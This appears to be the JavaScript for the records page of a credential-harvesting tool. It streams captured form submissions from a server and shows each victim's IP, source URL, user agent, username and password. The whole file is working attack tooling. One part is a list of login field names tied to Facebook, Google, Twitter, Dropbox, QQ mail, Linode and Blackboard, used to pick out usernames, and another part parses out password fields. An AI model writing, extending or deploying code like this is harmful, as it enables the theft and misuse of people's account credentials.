(function () {
  'use strict';

  if (window.location.pathname !== '/') {
    // return if it is not the records page
    return;
  }

  var $ = utils();

  // record model
  var record = function(data) {
    var usernameNames = [
      'name',
      'username',
      'user',
      'user_id', // Blackboard Learn
      'auth_username', // linode manager
      'email', // facebook, google
      'session[username_or_email]', // twitter
      'uin', // qq mail
      'login_email', // dropbox
      'login'
    ];

    var parseUsername = function () {
      var username = '';
      // Use method 'every' instead of 'each' to iterate usernameNames.
      // Method 'every' executes the provided callback for each element present
      // in the collection until it finds one where callback returns a false value.
      // If such an element is found, the 'every' method immediately returns false.
      // This simulates priority sequence in the usernaemNames array.
      _(JSON.parse(data.userInputs)).every(function (value, key) {
        var name = value.name.toLowerCase();
        if (_(usernameNames).contains(name)) {
          username = value.value;
          return false;
        }
      });
      return username;
    };

    var parsePassword = function () {
      var password = '';
      _(JSON.parse(data.userInputs)).each(function (value, key) {
        var type = key.substring(key.indexOf('.')+1);
        if (type === 'password') {
          password = value.value;
          return;
        }
      });
      return password;
    };

    var age = function () {
      return new Date(data.recordedAt * 1000).toRelativeTime();
    };

    var hostname = function() {
      var el = document.createElement("a");
      el.href = data.from_url;
      return el.hostname;
    };

    return {
      id          : data.id,
      ip          : data.ip,
      fromUrl     : data.fromUrl,
      userAgent   : data.userAgent,
      userInputs  : data.userInputs,
      recordedAt  : data.recordedAt,
      getUsername : parseUsername,
      getPassword : parsePassword,
      getHostname : hostname,
      getAge      : age
    };
  };

  // records view model
  var recordsViewModel = (function() {
    var records = ko.observableArray([]);

    var addRecord = function (data) {
      // use unshift to append new record at the begining of the array
      records.unshift(record(data));
    };

    var removeRecord = function (record, event) {
      // disable the button
      event.originalTarget.disabled = true;

      $['delete']('/records/'+record.id, {}, function(response) {
        if (response === 'deleted' || response === 'does not exist') {
          // recored deleted or does not exist, remove it from the modelview
          records.remove(record);
        } else {
          // failed to delete record, enable the button
          event.originalTarget.disabled = false;
        }
      }, {accept: 'text'});
    };

    var showRecord = function (el) {
      if (el.nodeType === 1) {
        // apply css transition to the new element
        $(el).css({
          transition: 'all 1s',
          opacity: '0'
        });

        // make sure the initial state is applied
        window.getComputedStyle(el).opacity;

        // fade it in
        $(el).css({
          opacity: '1'
        });
      }
    };

    var showDetails = function (record, event) {
      recordDetailViewModel.record(record);
    };

    // load existing records from server
    $.get('/records', {}, function(response) {
      var mappedRecords = _.map(response, function(data) { return record(data); });
      records(mappedRecords);
    }, {});

    return {
      records      : records,
      addRecord    : addRecord,
      removeRecord : removeRecord,
      showRecord   : showRecord,
      showDetails  : showDetails
    };
  })();

  ko.applyBindings(recordsViewModel, $('#records-table')[0]);

  // record detail view model
  var recordDetailViewModel = (function() {
    var record = ko.observable();

    var isSet = ko.computed(function() {
      return !_(record()).isUndefined();
    });

    return {
      record : record,
      isSet  : isSet
    };
  })();

  ko.applyBindings(recordDetailViewModel, $('#record-detail-panel')[0]);

  var eventSource = new EventSource('/listen/records');
  eventSource.onmessage = function(e) {
    console.info(e.data);
  };

  eventSource.addEventListener('newRecord', function(e) {
    var data = JSON.parse(e.data);
    recordsViewModel.addRecord(data);
  }, false);

  eventSource.onerror = function(e) {
    console.warn("connection lost, reconnecting...");
  };
})();
